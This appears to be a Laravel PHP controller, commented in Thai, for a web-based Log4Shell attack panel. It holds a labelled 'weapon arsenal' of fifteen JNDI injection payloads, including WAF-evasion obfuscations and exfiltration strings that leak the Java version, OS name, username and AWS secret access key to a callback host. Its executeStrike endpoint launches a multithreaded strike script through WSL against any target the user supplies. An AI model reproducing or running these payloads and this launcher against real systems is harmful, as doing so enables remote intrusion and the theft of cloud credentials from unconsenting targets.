<?php

namespace App\Http\Controllers;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use App\Models\ActivityLog;
use Illuminate\Support\Facades\Auth;

class KillChainController extends Controller
{
    /**
     * 🛡️ LOG4SHELL_WEAPON_SYSTEMS: คลังแสงอาวุธชุดเต็ม 15 รูปแบบ
     * บรรจุPayload ตามยุทธวิธีการอำพราง (Obfuscation)
     */
    private function getWeaponArsenal($callbackUrl = 'yourserver.com/a')
    {
        return [
            // --- GROUP A: RECONNAISSANCE (เพื่อการตรวจสอบพิกัด) ---
            'WEAPON_01' => [
                'name' => 'STANDARD_JNDI',
                'payload' => '${jndi:ldap://' . $callbackUrl . '}',
                'severity' => 'medium',
                'type' => 'Reconnaissance'
            ],
            'WEAPON_02' => [
                'name' => 'JAVA_VER_LEAK',
                'payload' => '${jndi:ldap://${java:version}.' . $callbackUrl . '}',
                'severity' => 'medium',
                'type' => 'Espionage'
            ],

            // --- GROUP B: EVASION & OBFUSCATION (เพื่อการหลบหลีก WAF) ---
            'WEAPON_03' => [
                'name' => 'LOWERCASE_BYPASS',
                'payload' => '${jndi:${lower:l}${lower:d}a${lower:p}://' . $callbackUrl . '}',
                'severity' => 'high',
                'type' => 'Infiltration'
            ],
            'WEAPON_04' => [
                'name' => 'UPPERCASE_BYPASS',
                'payload' => '${jndi:${upper:L}${upper:D}A${upper:P}://' . $callbackUrl . '}',
                'severity' => 'high',
                'type' => 'Infiltration'
            ],
            'WEAPON_05' => [
                'name' => 'COLON_MINUS_OBF',
                'payload' => '${${::-j}ndi:ldap://' . $callbackUrl . '}',
                'severity' => 'high',
                'type' => 'Evasion'
            ],
            'WEAPON_06' => [
                'name' => 'OBFUSCATED_COLON',
                'payload' => '${${::--j}${::--n}${::--d}${::--i}:ldap://' . $callbackUrl . '}',
                'severity' => 'high',
                'type' => 'Destruction'
            ],
            'WEAPON_07' => [
                'name' => 'NESTED_STRING_FRAG',
                'payload' => '${jndi:${lower:l}${upper:D}a${lower:p}://' . $callbackUrl . '}',
                'severity' => 'high',
                'type' => 'Evasion'
            ],
            'WEAPON_08' => [
                'name' => 'DATE_FUNCTION_J',
                'payload' => '${${date:\'j\'}ndi:ldap://' . $callbackUrl . '}',
                'severity' => 'high',
                'type' => 'Evasion'
            ],
            'WEAPON_09' => [
                'name' => 'NESTED_DEFAULT_VAL',
                'payload' => '${jndi:ldap://' . $callbackUrl . '${::-/a}}',
                'severity' => 'high',
                'type' => 'Infiltration'
            ],

            // --- GROUP C: ESPIONAGE & EXFILTRATION (เพื่อการจารกรรมข้อมูล) ---
            'WEAPON_10' => [
                'name' => 'ENV_VARIABLE_BASIC',
                'payload' => '${${env:BARFOO:-j}ndi:ldap://' . $callbackUrl . '}',
                'severity' => 'critical',
                'type' => 'Espionage'
            ],
            'WEAPON_11' => [
                'name' => 'OS_NAME_LEAK',
                'payload' => '${jndi:ldap://${sys:os.name}.' . $callbackUrl . '}',
                'severity' => 'critical',
                'type' => 'Espionage'
            ],
            'WEAPON_12' => [
                'name' => 'USER_DATA_SNIFF',
                'payload' => '${jndi:ldap://${env:USER}.' . $callbackUrl . '}',
                'severity' => 'critical',
                'type' => 'Espionage'
            ],
            'WEAPON_13' => [
                'name' => 'AWS_KEY_EXFIL',
                'payload' => '${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.' . $callbackUrl . '}',
                'severity' => 'critical',
                'type' => 'Espionage'
            ],
            'WEAPON_14' => [
                'name' => 'DYNAMIC_PROT_ENV',
                'payload' => '${${env:B:-j}nd${env:B:-i}${env:B:-:}ldap://' . $callbackUrl . '}',
                'severity' => 'critical',
                'type' => 'Evasion'
            ],
            'WEAPON_15' => [
                'name' => 'FULL_ENVIRONMENT_STRIKE',
                'payload' => '${${env:BARFOO:-j}ndi${env:BARFOO:-:}ldap://' . $callbackUrl . '}',
                'severity' => 'critical',
                'type' => 'Espionage'
            ],
        ];
    }

    public function index()
    {
        $weapons = $this->getWeaponArsenal();
        return view('admin.kill_chain', compact('weapons'));
    }

    public function executeStrike(Request $request)
    {
        // 1. ตรวจสอบพิกัดเป้าหมายและอาวุธ
        $request->validate([
            'target' => 'required',
            'weapon_id' => 'required',
            'thread_count' => 'integer|min:1|max:100'
        ]);

        $target = $request->target;
        $threads = $request->thread_count ?? 1;

        // ดึง Payload จากคลังอาวุธ
        $arsenal = $this->getWeaponArsenal();
        if (!isset($arsenal[$request->weapon_id])) {
            return response()->json(['status' => 'ERROR', 'message' => 'ไม่พบอาวุธในคลัง'], 400);
        }

        $payload = $arsenal[$request->weapon_id]['payload'];

        // 2. จัดการพิกัดไฟล์ (Path) ให้ Linux (WSL) เข้าใจ
        // แปลงจาก D:\project\storage\... เป็น /mnt/d/project/storage/...
        $scriptPath = storage_path('app/scripts/strike_manager.py');
        $linuxPath = str_replace(['\\', 'C:', 'D:'], ['/', '/mnt/c', '/mnt/d'], $scriptPath);

        // 3. ป้องกัน Command Injection
        $safeTarget = escapeshellarg($target);
        $safePayload = escapeshellarg($payload);
        $safeThreads = (int)$threads; // จำนวนเธรดเป็นตัวเลขเสมอ

        // 4. ลั่นไก! สั่งงานข้ามไปยัง Linux (WSL)
        // เราใช้คำสั่ง 'wsl python3 ...' เพื่อเรียกใช้พลังของ Linux จากฝั่ง Windows
        $command = "wsl python3 {$linuxPath} {$safeTarget} {$safePayload} {$safeThreads} 2>&1";
        $output = shell_exec($command);

        // 5. บันทึกปฏิบัติการ
        ActivityLog::create([
            'user_id'    => Auth::id(),
            'subject'    => 'KILL_CHAIN_STRIKE_V2_WSL',
            'details'    => "STRIKE: $target | THREADS: $threads | WEAPON: " . $arsenal[$request->weapon_id]['name'],
            'severity'   => $arsenal[$request->weapon_id]['severity'],
            'ip_address' => $request->ip(),
        ]);

        return response()->json([
            'status' => 'SUCCESS',
            'message' => 'Strike Dispatched via WSL',
            'raw_log' => $output
        ]);
    }
}
